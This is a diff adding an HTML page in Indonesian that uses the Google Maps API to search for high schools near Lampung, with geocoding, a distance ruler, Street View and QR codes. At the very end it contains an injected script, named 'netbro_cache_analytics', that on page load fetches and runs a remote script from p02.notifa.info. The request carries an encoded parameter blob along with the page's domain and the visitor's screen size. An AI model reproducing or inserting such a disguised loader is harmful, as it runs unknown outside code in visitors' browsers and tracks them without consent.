@@ -1,0 +1,261 @@
+<html>
+<head>
+<title>overlay SMA</title>
+<link rel="stylesheet" type="text/css" href="http://utils.exeter.ac.uk/acadsys/default.css">
+</head>
+<body>
+
+<div id="search" style="width:100%;height:50px">
+<form name='search' method='post' action='#' onSubmit='searchMap();return false;'>
+Cari SMA/Sederajad : <input type='text' size='50' name='findlocation'> <input type='submit' value='Cari Lokasi'>
+</form>
+</div>
+<div id="map_canvas" style="width:100%;height:80%"></div>
+<div id="lat_lng" style="position:absolute;left:100px;top:140px;width:280px;height:17px;z-index:2;background-color:#FFFFFF;border:1px solid #000080;padding:3px;text-align:center;">Lat: xxx.xxxxxx&nbsp;&nbsp;Lng: xxxx.xxxxxx&nbsp;&nbsp;Zoom: xx</div>
+<div id="rulerdistance" style="position:absolute;left:100px;top:165px;width:280px;height:34px;z-index:2;background-color:#FFFFFF;border:1px solid #000080;padding:3px;text-align:center;visibility:hidden">Distance: xxxx.xxkm (xxxx.xx miles)<br>Lat: xxx.xxxxxx&nbsp;&nbsp;Lng: xxxx.xxxxxx</div>
+<div id="mapqrcode" style="position:absolute;left:100px;top:207px;width:350px;height:225px;z-index:3;background-color:#FFFFFF;border:1px solid #000080;padding:3px;text-align:center;visibility:hidden"></div>
+<div id="streetviewinfo" style="position:absolute;left:105px;top:185px;width:140px;height:100px;z-index:3;padding:3px;text-align:right;visibility:hidden">
+   <div id="streetviewqrcode" style="position:absolute;left:255px;top:185px;width:350px;height:235px;z-index:3;background-color:#FFFFFF;border:1px solid #000080;padding:3px;text-align:center;visibility:hidden"></div>
+
+<script type="text/javascript" src="http://maps.google.com/maps/api/js?sensor=false"></script>
+<script type="text/javascript">
+
+function searchMap() {
+  initialize();
+  if (document.search.findlocation.value != "") {
+    findLocation(document.search.findlocation.value);
+  } else {
+    map.setCenter(homelocation);
+    map.setZoom(homezoom);
+    map.setMapTypeId(homemaptype);
+  }
+}
+
+function findLocation(locationtofind) {
+  if (geocoder) {
+    geocoder.geocode( {'address': locationtofind}, function(results,status) {
+      if (status == google.maps.GeocoderStatus.OK) {
+        searchlocation = locationtofind;
+        marker.setPosition(results[0].geometry.location);
+        map.setCenter(results[0].geometry.location);
+        map.setZoom(locationzoom);
+        showInfo(locationtofind)
+        google.maps.event.addListener(marker,'drag',function() {
+          showLatLngZoom();
+          if (document.getElementById("rulerdistance").style.visibility == "visible") {
+            rulerpoly.setPath([marker.getPosition(),marker2.getPosition()]);
+            showRulerDetails()
+          }
+        });
+        google.maps.event.addListener(marker,'dragstart',function() {
+          infowindow.close();
+          hideMapQRCode();
+        });
+        google.maps.event.addListener(marker,'dragend',function() {
+          showInfo(locationtofind)
+        });
+      } else {
+        alert("Geocode was not successful for the following reason: " + status);
+      }
+    });
+  }
+}
+
+function showInfo(whichlocationtofind) {
+  geocoder.geocode({'latLng': marker.getPosition()}, function(reverse,rstatus) {
+    if (rstatus == google.maps.GeocoderStatus.OK) {
+      if (reverse[0]) {
+        reversedetails = reverse[0].formatted_address;
+      } else {
+        reversedetails = "<i>{no location found}</i>";
+      }
+    } else {
+      reversedetails = "<i>{Geocoder failed due to: "+rstatus+"}</i>";
+    }
+    showLatLngZoom();
+    streetviewservice.getPanoramaByLocation(marker.getPosition(),50,function (svdata,svstatus) {
+    var infocontent = "&nbsp;<br><b>Nama SMA/Sederajat :</b> "+whichlocationtofind+"<br><b>Latitude, Longitude:</b> "+lat+", "+lng+"<br><b>Alamat : </b> "+reversedetails+"<br><br><div id='mapqrcodeshow' style='display:inline;'><a href=\"JavaScript:showMapQRCode("+lat+","+lng+");\"></div><div id='mapqrcodehide' style='display:none;'><a href=\"JavaScript:hideMapQRCode();\"><img src='qrcodeicon.png' width='20' height='20' border='0' hspace='5' align='absmiddle' alt='Hide QR Code'>Hide QR Code</a></div><br>";
+    if (svstatus == google.maps.StreetViewStatus.OK) {
+      var streetviewlink = "<br><a href='Javascript:switchToStreetView("+lat+","+lng+")'><img src='streetviewicon.png' width='17' height='20' border='0' hspace='5' align='absmiddle' alt='Switch to Street View'>Lihat Lokasi</a><br>&nbsp;";
+    } else {
+      var streetviewlink = "<br><img src='streetviewicon.png' width='17' height='20' hspace='5' align='absmiddle'>No Street View available for this location";
+    }
+    infowindow.setContent(infocontent+streetviewlink);
+    infowindow.open(map,marker);
+    });
+  });
+}
+
+function showLatLngZoom() {
+  lat = marker.getPosition().lat().toFixed(6);
+  lng = marker.getPosition().lng().toFixed(6);
+  document.getElementById("lat_lng").innerHTML = "Lat: "+lat+"&nbsp;&nbsp;Lng: "+lng+"&nbsp;&nbsp;Zoom: "+map.getZoom();
+}
+
+function showRulerDetails() {
+  document.getElementById("rulerdistance").innerHTML = "Jarak : "+distance(marker.getPosition().lat(),marker.getPosition().lng(),marker2.getPosition().lat(),marker2.getPosition().lng())+"<br>Lat: "+marker2.getPosition().lat().toFixed(6)+"&nbsp;&nbsp;Lng: "+marker2.getPosition().lng().toFixed(6);
+}
+
+function distance(lat1,lon1,lat2,lon2) {
+	var Rkm = 6371; // km
+	var Rmiles = 3959; // miles
+	var dLat = (lat2-lat1)*Math.PI/180;
+	var dLon = (lon2-lon1)*Math.PI/180;
+	var a = Math.sin(dLat/2)*Math.sin(dLat/2)+Math.cos(lat1*Math.PI/180)*Math.cos(lat2*Math.PI/180)*Math.sin(dLon/2)*Math.sin(dLon/2);
+	var c = 2*Math.atan2(Math.sqrt(a),Math.sqrt(1-a));
+	var dkm = Rkm*c;
+	var dmiles = Rmiles*c;
+  return ((dkm>1)?dkm.toFixed(2)+"km":Math.round(dkm*1000)+"m")+" ("+(((dmiles>1)?dmiles.toFixed(2)+" miles":Math.round(dmiles*1760)+" yards"))+")";
+}
+
+function switchToStreetView(lat,lng) {
+  var myLatLng = new google.maps.LatLng(lat,lng);
+  var myOptions = {
+    enableCloseButton: true,
+    position: myLatLng,
+    pov: {
+      heading: 0,
+      pitch: 0,
+      zoom: 1
+    }
+  }
+  streetview = new google.maps.StreetViewPanorama(document.getElementById("map_canvas"),myOptions);
+  if (document.getElementById("rulerdistance").style.visibility == "visible") {
+    marker2.setMap(null);
+    rulerpoly.setMap(null);
+    document.getElementById("rulerdistance").style.visibility = "hidden";
+  }
+  document.getElementById("lat_lng").style.visibility = "hidden";
+  hideMapQRCode();
+  document.getElementById("streetviewinfo").style.visibility = "visible";
+  google.maps.event.addListener(streetview,'closeclick',function() {
+    document.getElementById("streetviewinfo").style.visibility = "hidden";
+    hideSVQRCode();
+    document.getElementById("lat_lng").style.visibility = "visible";
+  });
+  google.maps.event.addListener(streetview,'position_changed',function() {
+    updateStreetviewInfo();
+  });
+  google.maps.event.addListener(streetview,'pov_changed',function() {
+    updateStreetviewInfo();
+  });
+}
+
+function updateStreetviewInfo() {
+  hideSVQRCode();
+  lat = streetview.getPosition().lat().toFixed(6);
+  lng = streetview.getPosition().lng().toFixed(6);
+  heading = Math.floor(streetview.getPov()['heading']);
+  if (heading < 0) {
+    heading = heading+360;
+  }
+  document.getElementById("streetviewdata").innerHTML = lat+"<br>"+lng+"<br>"+heading+"<br>"+Math.floor(streetview.getPov()['pitch'])+"<br>"+streetview.getPov()['zoom'].toFixed(2);
+}
+
+function showMapQRCode(qrlat,qrlng) {
+  document.getElementById("mapqrcodeshow").style.display = "none";
+  document.getElementById("mapqrcodehide").style.display = "inline";
+//  document.getElementById("mapqrcode").innerHTML = "<b>QR Code (& link below):</b> <img src='http://chart.apis.google.com/chart?cht=qr&chs=150x150&chl=http://maps.google.co.uk/maps?q="+qrlat+","+qrlng+"&z="+map.getZoom()+"' width='150' height='150' align='middle'><br><textarea cols='40' rows='3'>http://chart.apis.google.com/chart?cht=qr&chs=150x150&chl=http://maps.google.co.uk/maps?q="+qrlat+","+qrlng+"&z="+map.getZoom()+"</textarea>"; // Old Version
+  document.getElementById("mapqrcode").innerHTML = "<b>QR Code (& link below):</b> <img src='http://chart.apis.google.com/chart?cht=qr&chs=150x150&chl=http://maps.google.co.uk/maps?q=loc:"+qrlat+","+qrlng+"&z="+map.getZoom()+"' width='150' height='150' align='middle'><br><textarea cols='40' rows='3'>http://chart.apis.google.com/chart?cht=qr&chs=150x150&chl=http://maps.google.co.uk/maps?q=loc:"+qrlat+","+qrlng+"&z="+map.getZoom()+"</textarea>"; // New Version
+  document.getElementById("mapqrcode").style.visibility = "visible";
+}
+
+function hideMapQRCode() {
+  if (document.getElementById("mapqrcodehide")) {
+    document.getElementById("mapqrcodehide").style.display = "none";
+    document.getElementById("mapqrcodeshow").style.display = "inline";
+  }
+  document.getElementById("mapqrcode").style.visibility = "hidden";
+}
+
+function showSVQRCode() {
+  lat = streetview.getPosition().lat().toFixed(6);
+  lng = streetview.getPosition().lng().toFixed(6);
+  heading = Math.floor(streetview.getPov()['heading']);
+  if (heading < 0) {
+    heading = heading+360;
+  }
+  document.getElementById("streetviewqrcodelink").innerHTML = "<a href=\"JavaScript:hideSVQRCode();\"><img src='qrcodeicon.png' width='20' height='20' border='0' hspace='5' align='absmiddle' alt='Hide QR Code'>Hide QR Code</a>";
+//  document.getElementById("streetviewqrcode").innerHTML = "<b>QR Code (& link below):</b> <img src='http://chart.apis.google.com/chart?cht=qr&chs=150x150&chl=http://maps.google.co.uk/maps?q="+lat+","+lng+"&z="+map.getZoom()+"' width='150' height='150' align='middle'><br><textarea cols='40' rows='3'>http://chart.apis.google.com/chart?cht=qr&chs=150x150&chl=http://maps.google.co.uk/maps?q="+lat+","+lng+"&z="+map.getZoom()+"</textarea>"; // Old Version
+  document.getElementById("streetviewqrcodelink").innerHTML = "<a href=\"JavaScript:hideSVQRCode();\"><img src='qrcodeicon.png' width='20' height='20' border='0' hspace='5' align='absmiddle' alt='Hide QR Code'>Hide QR Code</a>";
+  document.getElementById("streetviewqrcode").innerHTML = "<b>QR Code (& link below):</b> <img src='http://chart.apis.google.com/chart?cht=qr&chs=150x150&chl=http://maps.google.co.uk/maps?q=loc:"+lat+","+lng+"&z="+map.getZoom()+"' width='150' height='150' align='middle'><br><textarea cols='40' rows='3'>http://chart.apis.google.com/chart?cht=qr&chs=150x150&chl=http://maps.google.co.uk/maps?q=loc:"+lat+","+lng+"&z="+map.getZoom()+"</textarea>"; // New Version
+  document.getElementById("streetviewqrcode").style.visibility = "visible";
+}
+
+function hideSVQRCode() {
+  document.getElementById("streetviewqrcodelink").innerHTML = "<a href=\"JavaScript:showSVQRCode();\"><img src='qrcodeicon.png' width='20' height='20' border='0' hspace='5' align='absmiddle' alt='Show QR Code'>Show QR Code</a>";
+  document.getElementById("streetviewqrcode").style.visibility = "hidden";
+}
+
+function initialize() {
+  geocoder = new google.maps.Geocoder();
+  var myOptions = {
+    center: homelocation,
+    zoom: homezoom,
+    mapTypeId: homemaptype,
+    mapTypeControl: true,
+    mapTypeControlOptions: {style: google.maps.MapTypeControlStyle.DROPDOWN_MENU},
+    navigationControl: true,
+    navigationControlOptions: {style: google.maps.NavigationControlStyle.DEFAULT}
+  }
+  map = new google.maps.Map(document.getElementById("map_canvas"),myOptions);
+  marker = new google.maps.Marker({ map: map, draggable: true, icon: markerimage });
+  marker2 = new google.maps.Marker({ map: map, draggable: true, icon: marker2image });
+  document.getElementById("lat_lng").style.visibility = "visible";
+  document.getElementById("rulerdistance").style.visibility = "hidden";
+  document.getElementById("streetviewinfo").style.visibility = "hidden";
+  google.maps.event.addListener(map,'zoom_changed',function() {
+    if (searchlocation != "") {
+      hideMapQRCode();
+      showLatLngZoom();
+    }
+  });
+  google.maps.event.addListener(map,'click',function(here) {
+    if (searchlocation != "") {
+      if (document.getElementById("rulerdistance").style.visibility == "visible") {
+        rulerpoly.setMap(null);
+      }
+      marker2.setMap(map);
+      marker2.setPosition(here.latLng);
+      rulerpoly = new google.maps.Polyline({
+        path: [marker.position,marker2.position] ,
+        strokeColor: "#FFFF00",
+        strokeOpacity: 0.5,
+        strokeWeight: 5
+      });
+      rulerpoly.setMap(map);
+      document.getElementById("rulerdistance").style.visibility = "visible";
+      showRulerDetails();
+    }
+  });
+	google.maps.event.addListener(marker2,'drag',function() {
+		rulerpoly.setPath([marker.getPosition(),marker2.getPosition()]);
+    showRulerDetails();
+	});
+	google.maps.event.addListener(marker2,'click',function() {
+    marker2.setMap(null);
+		rulerpoly.setMap(null);
+    document.getElementById("rulerdistance").style.visibility = "hidden";
+	});
+}
+
+var searchlocation = "";
+var map;
+var streetview;
+var streetviewservice = new google.maps.StreetViewService();
+var marker;
+var markerimage = new google.maps.MarkerImage("http://utils.exeter.ac.uk/acadsys/googlemapsapi/marker-red.png", new google.maps.Size(20,34), new google.maps.Point(0,0), new google.maps.Point(10,34));
+var marker2;
+var marker2image = new google.maps.MarkerImage("http://utils.exeter.ac.uk/acadsys/googlemapsapi/marker-green.png", new google.maps.Size(20,34), new google.maps.Point(0,0), new google.maps.Point(10,34));
+var rulerpoly;
+var infowindow = new google.maps.InfoWindow({ content: "None yet.", pixelOffset: new google.maps.Size(0,34) });
+var homelocation = new google.maps.LatLng(-5.397140,105.266789);
+var homezoom = 12;
+var homemaptype = google.maps.MapTypeId.HYBRID;
+var locationzoom = 14;
+initialize();
+
+</script>
+
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mEcb0u083lzafe5MJMA0uomYR52A%2fj6j97u4l3QHYXGaBvfgT5PS6RPKqn7WqDMjhQohl6YLYXt%2f8SHcqq1Fo1LvEZ6kzlHFDjIcYQ0lXPiLnDOBLJcrassTPedChEHrAV2iyxognrdulTRNjOgMiKsBG33WmbZ0EglGy7vCUq6xhtEh6KbrQI0%2fhZ1FnFLG9095m31RnjHRQgvOIJEwnkBpNZxSvyTwHziY4JJb6GBqYA1r7jZWixOEPOOKLoHnp1nZZblVbxDLqxLnJXR%2fsGPs7u%2bixHg%2f5cl%2bO2Aq1UmhOnKhippcYO%2f5oNXy2OgACLKxtmyhF3t38s91dTbgF8bPM5MewGYVDNGN3i2h1SF4qKZwG6MFRta%2fuExnc9U7YdHIpLjsdg5Sh%2b7zvHSgZ2bN7NSkSnF9zCf7zSiE4%2fND69E6TPDmLcFBmDTgJPLA2yn4oHqqCJJGGpBiUrwWAdrxUnarwihe0MWvcp%2bUzoFH29ok07Ayz5gsgFVhq4t5QMzJKOYpRrwI%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+</html>
